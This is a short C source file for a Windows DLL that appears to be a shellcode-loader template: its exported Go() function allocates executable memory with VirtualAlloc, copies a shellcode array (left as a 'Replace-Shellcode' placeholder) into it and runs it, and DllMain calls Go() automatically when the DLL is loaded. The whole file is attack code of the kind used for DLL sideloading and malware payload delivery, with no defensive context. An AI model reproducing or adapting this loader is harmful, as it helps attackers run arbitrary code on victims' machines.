#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern __declspec(dllexport) int Go(void);
int Go(void) {

		unsigned char sll[] = {Replace-Shellcode};

	void *exec = VirtualAlloc(0, sizeof sll, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, sll, sizeof sll);
	((void(*)())exec)();

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {

	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		Go();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
